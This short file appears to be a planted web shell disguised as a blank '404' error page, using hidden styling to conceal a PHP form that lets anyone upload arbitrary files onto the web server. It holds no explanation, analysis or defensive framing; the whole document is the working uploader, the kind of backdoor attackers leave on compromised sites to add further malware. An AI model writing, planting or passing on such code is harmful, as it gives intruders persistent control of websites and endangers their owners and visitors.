<img class=" height="200" src="https://i.ibb.co/64PG4Zp/images.png"/><title>404</title>
<font face="Courier new" color="black" size="6">sane nsd</font>
<style>body{font-size: 0;}h1{font-size: 12px}</style>
<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>Y</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>NOPE"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=SHUTUP> <br>"; }__halt_compiler();?></h1>
